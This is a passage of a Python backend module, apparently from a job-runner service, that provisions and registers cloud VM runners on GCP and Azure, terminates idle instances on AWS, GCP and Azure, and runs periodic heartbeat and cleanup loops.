        loop = asyncio.get_running_loop()
        try:
            resp = await loop.run_in_executor(
                None,
                lambda: boto3.client("ec2", **ec2_kwargs).run_instances(**run_kwargs),
            )
            instance_id = resp["Instances"][0]["InstanceId"]
            logger.info("provisioned EC2 instance %s for pool %s", instance_id, pool_id)
            await self._update_runner_instance_id(runner_id, instance_id)
        except Exception as exc:  # noqa: BLE001
            logger.warning("EC2 provisioning failed pool_id=%s: %s", pool_id, exc)

    async def _provision_gcp_instance(self, pool_id: str, cfg: dict) -> None:
        """Provision a GCE instance and register a runner for it.

        ``provider_config`` keys: ``project``, ``zone``, ``machine_type``,
        ``source_image`` (e.g. ``projects/debian-cloud/global/images/family/
        debian-12``), ``network`` (default ``global/networks/default``),
        ``service_account_json`` (optional inline key).
        """
        try:
            from google.cloud import compute_v1  # type: ignore[import-untyped]  # noqa: PLC0415
            from google.oauth2 import (
                service_account,  # type: ignore[import-untyped]  # noqa: PLC0415
            )
        except ImportError:
            logger.warning(
                "google-cloud-compute not installed — cannot auto-provision GCE runners"
            )
            return

        from app.config import settings as app_settings  # noqa: PLC0415
        api_url = getattr(app_settings, "public_api_url", "http://localhost:8000")
        project = cfg.get("project", "")
        zone = cfg.get("zone", "us-central1-a")
        machine_type = cfg.get("machine_type", "e2-medium")
        source_image = cfg.get("source_image", "")
        network = cfg.get("network", "global/networks/default")
        sa_json = cfg.get("service_account_json")

        if not project or not source_image:
            logger.warning(
                "GCP provisioning skipped — project and source_image are required"
            )
            return

        runner_id, token = await self._create_runner_and_token(pool_id, "gcp-auto")
        startup = self._bootstrap_user_data(api_url, token, runner_id)
        instance_name = f"noodle-runner-{runner_id[:12]}"

        def _create() -> None:
            creds = None
            if sa_json:
                import json as _json  # noqa: PLC0415
                creds = service_account.Credentials.from_service_account_info(
                    _json.loads(sa_json) if isinstance(sa_json, str) else sa_json
                )
            client = compute_v1.InstancesClient(credentials=creds)
            instance = compute_v1.Instance(
                name=instance_name,
                machine_type=f"zones/{zone}/machineTypes/{machine_type}",
                disks=[
                    compute_v1.AttachedDisk(
                        boot=True,
                        auto_delete=True,
                        initialize_params=compute_v1.AttachedDiskInitializeParams(
                            source_image=source_image
                        ),
                    )
                ],
                network_interfaces=[
                    compute_v1.NetworkInterface(
                        network=network,
                        access_configs=[
                            compute_v1.AccessConfig(name="External NAT")
                        ],
                    )
                ],
                metadata=compute_v1.Metadata(
                    items=[compute_v1.Items(key="startup-script", value=startup)]
                ),
            )
            client.insert(project=project, zone=zone, instance_resource=instance)

        loop = asyncio.get_running_loop()
        try:
            await loop.run_in_executor(None, _create)
            logger.info("provisioned GCE instance %s for pool %s", instance_name, pool_id)
            await self._update_runner_instance_id(runner_id, instance_name)
        except Exception as exc:  # noqa: BLE001
            logger.warning("GCE provisioning failed pool_id=%s: %s", pool_id, exc)

    async def _provision_azure_instance(self, pool_id: str, cfg: dict) -> None:
        """Provision an Azure VM and register a runner for it.

        ``provider_config`` keys: ``subscription_id``, ``resource_group``,
        ``location``, ``vm_size``, ``image`` (e.g.
        ``Canonical:0001-com-ubuntu-server-jammy:22_04-lts:latest``),
        ``admin_username``, ``admin_password`` or ``ssh_public_key``,
        ``subnet_id``. Uses ``DefaultAzureCredential`` unless a service
        principal is supplied via ``tenant_id``/``client_id``/``client_secret``.
        """
        try:
            from azure.identity import (  # type: ignore[import-untyped]  # noqa: PLC0415
                ClientSecretCredential,
                DefaultAzureCredential,
            )
            from azure.mgmt.compute import (  # type: ignore[import-untyped]  # noqa: PLC0415
                ComputeManagementClient,
            )
        except ImportError:
            logger.warning(
                "azure SDK not installed — cannot auto-provision Azure VMs "
                "(need azure-identity + azure-mgmt-compute)"
            )
            return

        from app.config import settings as app_settings  # noqa: PLC0415
        api_url = getattr(app_settings, "public_api_url", "http://localhost:8000")
        sub = cfg.get("subscription_id", "")
        rg = cfg.get("resource_group", "")
        location = cfg.get("location", "eastus")
        vm_size = cfg.get("vm_size", "Standard_B2s")
        image = cfg.get("image", "")
        admin_user = cfg.get("admin_username", "noodle")
        admin_password = cfg.get("admin_password")
        subnet_id = cfg.get("subnet_id", "")

        if not (sub and rg and image and subnet_id):
            logger.warning(
                "Azure provisioning skipped — subscription_id, resource_group, "
                "image and subnet_id are required"
            )
            return

        runner_id, token = await self._create_runner_and_token(pool_id, "azure-auto")
        import base64  # noqa: PLC0415
        custom_data = base64.b64encode(
            self._bootstrap_user_data(api_url, token, runner_id).encode()
        ).decode()
        vm_name = f"noodle-runner-{runner_id[:12]}"

        def _create() -> None:
            if cfg.get("client_secret"):
                cred = ClientSecretCredential(
                    tenant_id=cfg["tenant_id"],
                    client_id=cfg["client_id"],
                    client_secret=cfg["client_secret"],
                )
            else:
                cred = DefaultAzureCredential()
            client = ComputeManagementClient(cred, sub)
            pub, offer, sku, version = (image.split(":") + ["", "", "", ""])[:4]
            poller = client.virtual_machines.begin_create_or_update(
                rg,
                vm_name,
                {
                    "location": location,
                    "hardware_profile": {"vm_size": vm_size},
                    "storage_profile": {
                        "image_reference": {
                            "publisher": pub,
                            "offer": offer,
                            "sku": sku,
                            "version": version or "latest",
                        }
                    },
                    "os_profile": {
                        "computer_name": vm_name,
                        "admin_username": admin_user,
                        "admin_password": admin_password,
                        "custom_data": custom_data,
                    },
                    "network_profile": {
                        "network_interface_configurations": [
                            {
                                "name": f"{vm_name}-nic",
                                "ip_configurations": [
                                    {
                                        "name": f"{vm_name}-ip",
                                        "subnet": {"id": subnet_id},
                                    }
                                ],
                            }
                        ]
                    },
                },
            )
            poller.result()

        loop = asyncio.get_running_loop()
        try:
            await loop.run_in_executor(None, _create)
            logger.info("provisioned Azure VM %s for pool %s", vm_name, pool_id)
            await self._update_runner_instance_id(runner_id, vm_name)
        except Exception as exc:  # noqa: BLE001
            logger.warning("Azure provisioning failed pool_id=%s: %s", pool_id, exc)

    async def _create_runner_and_token(self, pool_id: str, name_prefix: str) -> tuple[str, str]:
        from app.models import Runner  # noqa: PLC0415
        from app.services.crypto import create_payload_token  # noqa: PLC0415
        runner = Runner(
            pool_id=pool_id,
            name=f"{name_prefix}-{_uuid_hex()[:8]}",
            status="offline",
        )
        async with SessionLocal() as session:
            session.add(runner)
            await session.commit()
            runner_id = runner.id

        token = create_payload_token(
            {"sub": runner_id, "pool_id": pool_id, "kind": "runner_registration"},
            ttl_seconds=86_400,
        )
        return runner_id, token

    async def _update_runner_instance_id(self, runner_id: str, instance_id: str) -> None:
        async with SessionLocal() as session:
            runner = await session.get(Runner, runner_id)
            if runner is not None:
                caps = dict(runner.capabilities)
                caps["instance_id"] = instance_id
                runner.capabilities = caps
                await session.commit()

    async def idle_terminate_cloud_runners(self) -> None:
        """Terminate idle cloud-provisioned runners past their idle threshold."""

        async with SessionLocal() as session:
            runners = (await session.scalars(
                select(Runner).where(Runner.status == "online", Runner.current_runs == 0)
            )).all()

            pool_ids = {r.pool_id for r in runners if r.pool_id}
            pools: dict[str, RunnerPool] = {}
            if pool_ids:
                pools = {
                    p.id: p
                    for p in (
                        await session.scalars(
                            select(RunnerPool).where(RunnerPool.id.in_(pool_ids))
                        )
                    ).all()
                }

            now = datetime.now(UTC)
            to_terminate = []
            for runner in runners:
                pool = pools.get(runner.pool_id)
                if pool is None:
                    continue
                cfg = pool.provider_config
                if cfg.get("cloud_provider") not in ("aws", "gcp", "azure"):
                    continue
                idle_threshold = int(cfg.get("idle_terminate_seconds", 300))
                if runner.last_seen_at is None:
                    continue
                last = runner.last_seen_at
                if last.tzinfo is None:
                    last = last.replace(tzinfo=UTC)
                if (now - last).total_seconds() >= idle_threshold:
                    instance_id = runner.capabilities.get("instance_id")
                    if instance_id:
                        to_terminate.append((runner, instance_id, cfg))

        for runner, instance_id, cfg in to_terminate:
            try:
                loop = asyncio.get_running_loop()
                await loop.run_in_executor(
                    None,
                    lambda iid=instance_id, c=cfg: _terminate_cloud_instance(iid, c),
                )
                async with SessionLocal() as session:
                    r = await session.get(Runner, runner.id)
                    if r is not None:
                        await session.delete(r)
                        await session.commit()
                logger.info("terminated idle cloud instance %s runner %s", instance_id, runner.id)
            except Exception as exc:  # noqa: BLE001
                logger.warning("failed to terminate instance %s: %s", instance_id, exc)


def _terminate_cloud_instance(instance_id: str, cfg: dict) -> None:
    provider = cfg.get("cloud_provider")
    if provider == "aws":
        _terminate_ec2(instance_id, cfg)
    elif provider == "gcp":
        _terminate_gce(instance_id, cfg)
    elif provider == "azure":
        _terminate_azure(instance_id, cfg)


def _terminate_ec2(instance_id: str, cfg: dict) -> None:
    import boto3  # noqa: PLC0415
    kw: dict = {"region_name": cfg.get("region", "us-east-1")}
    if cfg.get("aws_access_key_id"):
        kw["aws_access_key_id"] = cfg["aws_access_key_id"]
    if cfg.get("aws_secret_access_key"):
        kw["aws_secret_access_key"] = cfg["aws_secret_access_key"]
    boto3.client("ec2", **kw).terminate_instances(InstanceIds=[instance_id])


def _terminate_gce(instance_name: str, cfg: dict) -> None:
    from google.cloud import compute_v1  # noqa: PLC0415
    from google.oauth2 import service_account  # noqa: PLC0415
    creds = None
    sa_json = cfg.get("service_account_json")
    if sa_json:
        import json as _json  # noqa: PLC0415
        creds = service_account.Credentials.from_service_account_info(
            _json.loads(sa_json) if isinstance(sa_json, str) else sa_json
        )
    client = compute_v1.InstancesClient(credentials=creds)
    client.delete(
        project=cfg["project"], zone=cfg.get("zone", "us-central1-a"),
        instance=instance_name,
    )


def _terminate_azure(vm_name: str, cfg: dict) -> None:
    from azure.identity import (  # noqa: PLC0415
        ClientSecretCredential,
        DefaultAzureCredential,
    )
    from azure.mgmt.compute import ComputeManagementClient  # noqa: PLC0415
    if cfg.get("client_secret"):
        cred = ClientSecretCredential(
            tenant_id=cfg["tenant_id"], client_id=cfg["client_id"],
            client_secret=cfg["client_secret"],
        )
    else:
        cred = DefaultAzureCredential()
    client = ComputeManagementClient(cred, cfg["subscription_id"])
    client.virtual_machines.begin_delete(cfg["resource_group"], vm_name).result()


def _uuid_hex() -> str:
    import uuid  # noqa: PLC0415
    return uuid.uuid4().hex


def build_env_payload(
    env_id: str, python_version: str, packages: list[str], noodle_version: str = "0.0.1"
) -> dict:
    packages_hash = hashlib.sha256(
        json.dumps(sorted(packages)).encode()
    ).hexdigest()[:16]
    return {
        "id": env_id,
        "python_version": python_version,
        "packages": packages,
        "packages_hash": packages_hash,
        "noodle_version": noodle_version,
    }


class _QueuedError(Exception):
    """Raised when a run was queued rather than dispatched immediately."""


# ---------------------------------------------------------------------------
# Cloud runner idle-terminate background loop
# ---------------------------------------------------------------------------

async def cloud_idle_terminate_loop() -> None:
    """Periodically terminate idle cloud runners.

    Run-queue dispatch lives in :mod:`app.services.queue.run_queue_dispatch_loop`
    now; this loop is the residual non-queue work the old
    ``queue_dispatch_loop`` did (cleaning up cloud runner instances that have
    been idle long enough to release).
    """
    dispatcher._reset_loop_state()
    while True:
        await asyncio.sleep(30)
        try:
            await dispatcher.idle_terminate_cloud_runners()
        except asyncio.CancelledError:
            raise
        except Exception:  # noqa: BLE001 - never let one tick kill the loop
            logger.exception("cloud_idle_terminate_loop tick failed")


async def runner_heartbeat_loop() -> None:
    """Send pings to connected agents and reap unresponsive runners.

    Single loop so the cadence stays predictable: ping every
    ``runner_heartbeat_interval_seconds``; after ``runner_offline_after_seconds``
    of silence a runner is marked offline and its in-flight runs are requeued.

    Disabled when either knob is set to 0 — useful for local dev where agents
    aren't part of the picture.
    """
    interval = max(1, settings.runner_heartbeat_interval_seconds)
    offline_after = settings.runner_offline_after_seconds
    if offline_after <= 0:
        return
    while True:
        await asyncio.sleep(interval)
        try:
            await dispatcher.ping_connected_agents()
            await dispatcher.mark_stale_runners_offline(
                offline_after_seconds=offline_after
            )
        except asyncio.CancelledError:
            raise
        except Exception:  # noqa: BLE001
            logger.exception("runner_heartbeat_loop tick failed")


# Singleton
dispatcher = RemoteDispatcher()
